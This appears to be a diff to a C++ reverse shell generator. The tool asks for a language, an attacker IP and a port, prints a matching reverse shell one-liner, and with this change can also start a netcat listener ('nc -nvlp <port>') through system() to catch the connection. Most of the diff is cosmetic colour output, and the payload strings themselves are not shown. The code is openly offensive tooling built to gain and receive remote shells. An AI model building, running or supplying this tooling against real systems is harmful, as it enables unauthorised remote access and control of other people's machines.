@@ -3,7 +3,22 @@
 #include<regex>
 #include<algorithm>
 #include<cctype>
+#include<cstdlib>
 using namespace std;
+
+
+#define RESET   "\033[0m"
+#define BLACK   "\033[30m"
+#define RED     "\033[31m"
+#define GREEN   "\033[32m"
+#define YELLOW  "\033[33m"
+#define BLUE    "\033[34m"
+#define MAGENTA "\033[35m"
+#define CYAN    "\033[36m"
+#define WHITE   "\033[37m"
+#define BOLD      "\033[1m"
+#define CONCEAL    "\033[8m"
+#define BRIGHT_WHITE "\033[97m"
 
 
 bool isValidIP(const string& ip);
@@ -23,10 +38,10 @@ int main()
   printAsciiArt();
   int portnum;
 
-  string n,t;
+  string n,t,res,listener;
   string ip,port;
-  std::cout<<"Choose an option from the menu below"<<endl;
-  cout<<"1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl"<<endl;
+  std::cout<< GREEN << "[+]Choose an option from the menu below"<< RESET <<endl;
+  cout<< CYAN << "1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl"<< RESET <<endl<<endl;
   cout<<"Your Input(in words) : ";
   cin>>n;
 
@@ -34,7 +49,7 @@ int main()
 
   if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl"))
   {
-    cout<<"Invalid Input!\nexiting!"<<endl;
+    cout<< RED <<"Invalid Input!\nexiting!"<< RESET <<endl;
     exit(0);
   }
 
@@ -42,7 +57,7 @@ int main()
   cin>>ip;
   if (!isValidIP(ip))
   {
-    cout<<"Invalid IP\nexiting!"<<endl;
+    cout<< RED <<"Invalid IP\nexiting!"<< RESET <<endl;
     exit(0);
   }
   std::cout<<"Enter listening port : ";
@@ -51,43 +66,53 @@ int main()
   try {
         portnum = stoi(port);
         if (isValidPort(portnum) != 0) {
-            cout << "Invalid Port\nexiting!" << endl;
+            cout << RED << "Invalid Port\nexiting!"<< RESET << endl;
             exit(0);
         }
     } catch (const invalid_argument& e) {
-        cout << "Invalid Port (not a number)\nexiting!" << endl;
+        cout << RED <<"Invalid Port (not a number)\nexiting!" << RESET << endl;
         exit(0);
     } catch (const out_of_range& e) {
-        cout << "Invalid Port (out of range)\nexiting!" << endl;
+        cout << RED << "Invalid Port (out of range)\nexiting!"<< RESET << endl;
         exit(0);
     }
 
 
   if (n=="python")
   {
-    cout<<"Your python reverse shell is  : "<<python(ip,port)<<endl;
+    cout<<"Your python reverse shell is  : "<< BLUE << python(ip,port)<< RESET <<endl<<endl;
   }
   else if (n=="netcat")
   {
-    cout<<"Your netcat reverse shell is : "<<netcat(ip,port)<<endl;
+    cout<<"Your netcat reverse shell is : "<< MAGENTA <<  netcat(ip,port)<< RESET <<endl<<endl;
   }
   else if (n=="bash")
   {
-    cout<<"Your bash reverse shell is : "<<bash(ip,port)<<endl;
+    cout<<"Your bash reverse shell is : "<< YELLOW << bash(ip,port)<< RESET <<endl<<endl;
   }
   else if (n=="php")
   {
-    cout<<"Your php reverse shell is : "<<php(ip,port)<<endl;
+    cout<<"Your php reverse shell is : "<< BOLD << php(ip,port)<< RESET <<endl<<endl;
   }
   else if(n=="ruby")
   {
-    cout<<"Your ruby reverse shell is : "<<ruby(ip,port)<<endl;
+    cout<<"Your ruby reverse shell is : "<< MAGENTA << ruby(ip,port)<< RESET <<endl<<endl;
   }
   else if(n=="perl")
   {
-    cout<<"Your perl reverse shell is : "<<perl(ip,port)<<endl;
+    cout<<"Your perl reverse shell is : "<< RED << perl(ip,port)<< RESET <<endl<<endl;
   }
 
+cout<< GREEN <<"[+]Do You want to start the listener ?[Y/N]"<< RESET <<endl;
+cin>>res;
+
+std::transform(res.begin(), res.end(), res.begin(), ::tolower);
+if (res=="y")
+{
+  cout<< BOLD << "[+]Starting the netcat listener..."<< RESET <<endl;
+  listener = "nc -nvlp" + std::to_string(portnum);
+  system(listener.c_str());
+}
 
 
   return 0;
@@ -162,6 +187,7 @@ string perl(string ip, string port)
   return shell;
 
 }
+
 string ruby(string ip, string port)
 {
   string shell,s1,s2;
@@ -184,14 +210,13 @@ void printAsciiArt() {
 /_______  /\___|_  /  \___  >____/____/____|   \____/|   __/
         \/       \/       \/                         |__|
 
+              A reverse shell generator and listener!
+              Made with <3 by EF3X0S.
 
 
-                                              A reverse shell generator
-                                              Made with <3 by EF3X0S.
 
 
     )";
 
-    cout << asciiArt << endl;
+    cout <<  RED << asciiArt << RESET << endl;
 }
-
